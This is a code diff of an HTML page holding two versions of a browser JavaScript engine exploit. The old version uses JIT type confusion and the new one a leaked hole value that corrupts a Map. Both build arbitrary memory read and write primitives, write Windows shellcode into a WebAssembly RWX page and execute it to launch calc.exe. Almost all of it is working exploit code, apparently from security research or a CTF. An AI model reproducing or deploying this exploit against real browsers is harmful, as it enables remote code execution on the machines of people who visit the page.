@@ -1,246 +1,162 @@
 <script>
-  function gc() {
-      for (let i = 0; i < 0x200; i++) {
-          new ArrayBuffer(0x100000);
-      }
-  }
-  
-  
-  
-  // We need to start with stable JSArray maps
-  class Box extends Array
+  // function gc(){
+  //       for(var i = 0;i < ((0x2000));i++){
+  //         var a = new ArrayBuffer(0x10000);
+  //       }
+  //     }
+  function gc()
   {
-      constructor(...args) {
-          super(...args);
-      }
-  };
-  
-  var a = new Box(1,2,3);
-  
-  function set_smi_arr(smi_arr,x) {
-      for (let i = 0; i < 0x200; ++i) {
-          ++i;
-      }
-      if (x) {
-          a = smi_arr;
-      }
+    /*
+    for(var i = 0;i < (0x45);i++){
+      var a = new ArrayBuffer(0x100000);
+    }
+    */
   }
-  
-  function set_double_arr(double_arr,x) {
-      for (let i = 0; i < 0x200; ++i) {
-          ++i;
-      }
-      if (x) {
-          a = double_arr;
-      }
-  }
-  
-  function leak_elems_and_len() {
-      for (let i = 0; i < 0x200; ++i) { 
-          ++i;
+      var buf = new ArrayBuffer(16);
+      var f64 = new Float64Array(buf);
+      var u32 = new Uint32Array(buf);
+      
+      var dv = new DataView(buf);
+      
+      function f2i(val)
+      {
+          dv.setFloat64(0,val,true);
+        return dv.getBigUint64(0,true);
       }
       
-      return a[7];
-  }
-  
-  function set_elems_and_len(d) {
-      for (let i = 0; i < 0x200; ++i) { 
-          ++i;
+      function i2f(val)
+      {
+          dv.setBigUint64(0,BigInt(val),true);
+        return dv.getFloat64(0,true);
       }
       
-  
-      a[7] = d;
-  }
-  
-  function read_corrupted_arr(corrupted_arr,idx) {
-      for (let i = 0; i < 0x200; ++i) {
-          ++i;
+      function f2half(f)
+      {
+        f64[0] = f;
+        let tmp = Array.from(u32);
+        return tmp;
       }
-      return corrupted_arr[idx];
-  }
-  
-  function write_corrupted_arr(corrupted_arr,idx,val) {
-      for (let i = 0; i < 0x200; ++i) {
-          ++i;
+      
+      function half2f(val)
+      {
+        u32.set(val);
+        return f64[0];
       }
-      corrupted_arr[idx] = val;
-  }
-  
-  var b1 = new Box(1,2,3,4);
-  set_smi_arr(b1, true);
-  
-  a.x = 1;
-  delete a.x;
-  
-  for (var i = 0; i < 0x3000; ++i) {
-      set_smi_arr(b1, false);
-  }
-  
-  a[0] = 1.1;
-  var b2 = new Box(1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.10,11.11,12.12);
-  set_double_arr(b2, true);
-  
-  for (var i = 0; i < 0x3000; ++i) {
-      set_double_arr(b2, false);
-  }
-  
-  for (var i = 0; i < 0x3000; ++i) {
-      leak_elems_and_len();
-      set_elems_and_len(12.13);
-      read_corrupted_arr(b2, 0);
-      write_corrupted_arr(b2, 0, 1.1);
-  }
-  gc();
-  var tmp = {};
-  gc();
-  var temp = [];
-  gc();
-  var oob_arr = new Box(1,2,3,4,5,6,7,8,9,10,11,12);
-  gc();
-  var corrupted_arr = new Box(1.1,1.2);
-  gc();
-  var hijacked_arr = [1.337,13.37,133.7];
-  gc();
-  var obj_arr = {padding:tmp,obj:temp};
-  gc();
-  
-  var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-  var wasmModule = new WebAssembly.Module(wasmCode);
-  var wasmInstance = new WebAssembly.Instance(wasmModule, {});
-  var evil_f = wasmInstance.exports.main;
-  gc();
-  // big_arr[0] = 0x1337n;
-  // var leaks = [wi,sb];
-  
-  set_smi_arr(oob_arr, true);
-  
-  var buf = new ArrayBuffer(8);
-  var f64 = new Float64Array(buf);
-  var u32 = new Uint32Array(buf);
-  
-  var dv = new DataView(buf);
-  
-  function f2i(val)
-  {
-      dv.setFloat64(0,val,true);
-    return dv.getBigUint64(0,true);
-  }
-  
-  function i2f(val)
-  {
-      dv.setBigUint64(0,BigInt(val),true);
-    return dv.getFloat64(0,true);
-  }
-  
-  function f2half(f)
-  {
-    f64[0] = f;
-    let tmp = Array.from(u32);
-    return tmp;
-  }
-  
-  function half2f(val)
-  {
-    u32.set(val);
-    return f64[0];
-  }
-  
-  function p64f(high,low){
-    let num = (high * 0x100000000n) + low;
-    return i2f(num);
-  }
-  
-  function ByteToBigIntArray(payload)
-  {
-  
-      let sc = []
-      let tmp = 0n;
-      let lenInt = BigInt(Math.floor(payload.length/8))
-      for (let i = 0n; i < lenInt; i += 1n) {
+      
+      function p64f(high,low){
+        dv.setUint32(0,high,true);
+        dv.setUint32(4,low,true);
+        return dv.getFloat64(0,true);
+      }
+    
+      function ByteToBigIntArray(payload)
+      {
+    
+          let sc = []
+          let tmp = 0n;
+          let lenInt = BigInt(Math.floor(payload.length/8))
+          for (let i = 0n; i < lenInt; i += 1n) {
+              tmp = 0n;
+              for(let j=0n; j<8n; j++){
+                  tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
+              }
+              sc.push(tmp);
+          }
+    
+          let len = payload.length%8;
           tmp = 0n;
-          for(let j=0n; j<8n; j++){
-              tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
+          for(let i=0n; i<len; i++){
+              tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
           }
           sc.push(tmp);
+          return sc;
       }
-  
-      let len = payload.length%8;
-      tmp = 0n;
-      for(let i=0n; i<len; i++){
-          tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
+    
+      function hex(i){
+        return "0x"+i.toString(16).padStart(16,"0");
       }
-      sc.push(tmp);
-      return sc;
-  }
+    
+       function trigger() {
+            let a = [], b = [];
+            let s = '"'.repeat(0x800000);
+            a[20000] = s;
+            for (let i = 0; i < 10; i++) a[i] = s;
+            for (let i = 0; i < 10; i++) b[i] = a;
+    
+            try {
+                JSON.stringify(b);
+            } catch (hole) {
+                return hole;
+            }
+            throw new Error('could not trigger');
+        }
+        
+        var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+        var wasmModule = new WebAssembly.Module(wasmCode);
+        var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+        var f = wasmInstance.exports.main;
+        var buf = new ArrayBuffer(0x100);
+        var dataview = new DataView(buf);
   
-  function hex(i){
-    return i.toString(16).padStart(16,"0");
-  }
+        let hole = trigger();
+        var tmp = {};
+
+        var map = new Map();
+        map.set(0xdead, 1);
+        map.set(hole, 0x1337);
+        // Due to special handling of hole values, this ends up setting the size of the map to -1
+        for(let i = 0;i < 2;i++){
+          map.delete(hole);
+        }
+
+        map.delete(0xdead);
+        var float_arr = [6.3659873719076857e-314, 6.3659873719076857e-314,6.3659873719076857e-314,6.3659873719076857e-314,6.3659873719076857e-314,6.3659873719076857e-314,6.3659873719076857e-314,1.1,2.2];
+        var cruppted_arr = [1.1,2.2,3.3,4.4,5.5,6.6];
+        var target_arr = [7.7,8,8];
+        var obj_dict = {mark:0x1337aabb,obj:wasmInstance,mark1:0x0,pad:0x0};
+        
+        
+        map.set(0x37,0);
+        //alert(hex(map.size));
+        
+        map.set(0x15,cruppted_arr);
+        
+        //alert(cruppted_arr.length);
+        let element_addr = f2i(cruppted_arr[7]) & 0xffffffffn;
+        //alert("[+]element addr : " + hex(element_addr));
+        cruppted_arr[7] = i2f((0x1122n << 32n) + element_addr);
+        alert("[+]oob arr length : " + hex((cruppted_arr.length)));
+
+        var obj_idx = 16;
+        function addressOf(){
+          return f2i(cruppted_arr[obj_idx])-0x1n;
+        }
+        let wasm_instance_addr = addressOf();
+        alert("[+]wasm instance addr : " + hex(wasm_instance_addr));
+        var element_idx = 13;
+
+        function arb_read(addr){
+          cruppted_arr[element_idx] = i2f((4n << 32n) + addr - 0x8n + 0x1n);
+          return f2i(target_arr[0]);
+      }
+
+      var rwx_page_addr = (arb_read(wasm_instance_addr + 0x40n)) & 0xffffffffn;
+
+      function arb_write(addr,data){
+            cruppted_arr[element_idx] = i2f((4n << 32n) + addr - 0x8n + 0x1n);
+            target_arr[0] = i2f(data);
+        }
+        obj_dict.obj = buf;
+        let buf_addr = addressOf();
+        alert("[+]buf_addr: " + hex(buf_addr));
+        var backing_store = buf_addr + 0x14n;
+        alert("[+]backing_store: " + hex(backing_store));
   
-  f64[0] = leak_elems_and_len();
-  //alert(hex(f2i(f64[0])));
-  if((f2i(f64[0]) >> 32n) != 0x4n){
-      //alert(hex(f2i(f64[0])));
-      location.href = 'test.ele.me.html';
-  }
-  u32[1] = 0x4242;
-  var init = f64[0];
-  
-  set_elems_and_len(init);
-  //hajack the big_arr
-  
-  oob_arr = corrupted_arr;
-  
-  var element_idx = 3;
-  var obj_idx = 14;
-  
-  // oob_arr = corrupted_arr;
-  // //leak the base and the external pointer
-  var length = oob_arr.length;
-  alert("[+]The length of oob arr is : " + hex(length));
-  
-  function arb_read(addr)
-  {
-    oob_arr[element_idx] = i2f((4n << 32n) + addr - 0x8n + 0x1n);
-    return f2i(hijacked_arr[0]);
-  }
-  
-  function arb_write(addr, data)
-  {
-    oob_arr[element_idx] = i2f((4n << 32n) + addr - 0x8n + 0x1n);
-    hijacked_arr[0] = i2f(data);
-  }
-  
-  obj_arr.obj = wasmInstance;
-  
-  var wasm_instance_addr = f2i(oob_arr[obj_idx]) & 0xffffffffn - 0x1n;
-  
-  // alert("[+]obj addr : " + hex(wasm_instance_addr));
-  
-  var rwx_page_addr = (arb_read(wasm_instance_addr + 0x40n)) & 0xffffffffn;
-  
-  
-  alert("[+] rwx addr : 0x" + hex(rwx_page_addr));
-  // %DebugPrint(oob_arr);
-  // %DebugPrint(hijacked_arr);
-  // %SystemBreak();
-  // let shellcode = [0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,0x1c,0x00,0x00,0x00,0x44,0x49,0x53,0x50,0x4c,0x41,0x59,0x3d,0x3a,0x30,0x20,0x67,0x6e,0x6f,0x6d,0x65,0x2d,0x63,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05];
-  
-  ////console.log("xmzyshypnc");
-  
-  //let shellcode = [0xcc,0xcc,0xcc,0xcc];
-  var sc_buf = new ArrayBuffer(0x100);
-  var sc_dataview = new DataView(sc_buf);
-  obj_arr.obj = sc_buf;
-  let buf_addr = f2i(oob_arr[obj_idx]) & 0xffffffffn - 0x1n;
-  var backing_store = buf_addr + 0x14n;
-  arb_write(backing_store,rwx_page_addr);
-  // alert("[+]buf addr : " + hex(buf_addr));
-  var shellcode = [0x89,0xe5,0x83,0xec,0x20,0x31,0xdb,0x64,0x8b,0x5b,0x30,0x8b,0x5b,0x0c,0x8b,0x5b,0x1c,0x8b,0x1b,0x8b,0x1b,0x8b,0x43,0x08,0x89,0x45,0xfc,0x8b,0x58,0x3c,0x01,0xc3,0x8b,0x5b,0x78,0x01,0xc3,0x8b,0x7b,0x20,0x01,0xc7,0x89,0x7d,0xf8,0x8b,0x4b,0x24,0x01,0xc1,0x89,0x4d,0xf4,0x8b,0x53,0x1c,0x01,0xc2,0x89,0x55,0xf0,0x8b,0x53,0x14,0x89,0x55,0xec,0xeb,0x32,0x31,0xc0,0x8b,0x55,0xec,0x8b,0x7d,0xf8,0x8b,0x75,0x18,0x31,0xc9,0xfc,0x8b,0x3c,0x87,0x03,0x7d,0xfc,0x66,0x83,0xc1,0x08,0xf3,0xa6,0x74,0x05,0x40,0x39,0xd0,0x72,0xe4,0x8b,0x4d,0xf4,0x8b,0x55,0xf0,0x66,0x8b,0x04,0x41,0x8b,0x04,0x82,0x03,0x45,0xfc,0xc3,0xba,0x78,0x78,0x65,0x63,0xc1,0xea,0x08,0x52,0x68,0x57,0x69,0x6e,0x45,0x89,0x65,0x18,0xe8,0xb8,0xff,0xff,0xff,0x31,0xc9,0x51,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x89,0xe3,0x41,0x51,0x53,0xff,0xd0,0x31,0xc9,0xb9,0x01,0x65,0x73,0x73,0xc1,0xe9,0x08,0x51,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x89,0x65,0x18,0xe8,0x87,0xff,0xff,0xff,0x31,0xd2,0x52,0xff,0xd0];
-  alert(shellcode.length);
-  for(var i = 0; i < shellcode.length; i++) {
-    sc_dataview.setUint8(i, shellcode[i], true);
-  }
-  // alert("1");
-  evil_f();
-  </script>
+        arb_write(backing_store,(0x2n << 32n) + rwx_page_addr);
+        var shellcode = [0x89,0xe5,0x83,0xec,0x20,0x31,0xdb,0x64,0x8b,0x5b,0x30,0x8b,0x5b,0x0c,0x8b,0x5b,0x1c,0x8b,0x1b,0x8b,0x1b,0x8b,0x43,0x08,0x89,0x45,0xfc,0x8b,0x58,0x3c,0x01,0xc3,0x8b,0x5b,0x78,0x01,0xc3,0x8b,0x7b,0x20,0x01,0xc7,0x89,0x7d,0xf8,0x8b,0x4b,0x24,0x01,0xc1,0x89,0x4d,0xf4,0x8b,0x53,0x1c,0x01,0xc2,0x89,0x55,0xf0,0x8b,0x53,0x14,0x89,0x55,0xec,0xeb,0x32,0x31,0xc0,0x8b,0x55,0xec,0x8b,0x7d,0xf8,0x8b,0x75,0x18,0x31,0xc9,0xfc,0x8b,0x3c,0x87,0x03,0x7d,0xfc,0x66,0x83,0xc1,0x08,0xf3,0xa6,0x74,0x05,0x40,0x39,0xd0,0x72,0xe4,0x8b,0x4d,0xf4,0x8b,0x55,0xf0,0x66,0x8b,0x04,0x41,0x8b,0x04,0x82,0x03,0x45,0xfc,0xc3,0xba,0x78,0x78,0x65,0x63,0xc1,0xea,0x08,0x52,0x68,0x57,0x69,0x6e,0x45,0x89,0x65,0x18,0xe8,0xb8,0xff,0xff,0xff,0x31,0xc9,0x51,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x89,0xe3,0x41,0x51,0x53,0xff,0xd0,0x31,0xc9,0xb9,0x01,0x65,0x73,0x73,0xc1,0xe9,0x08,0x51,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x89,0x65,0x18,0xe8,0x87,0xff,0xff,0xff,0x31,0xd2,0x52,0xff,0xd0];
+        for(var i = 0; i < shellcode.length; i++) {
+          dataview.setUint8(i, shellcode[i], true);
+        }
+        f();
+        
+       </script> 
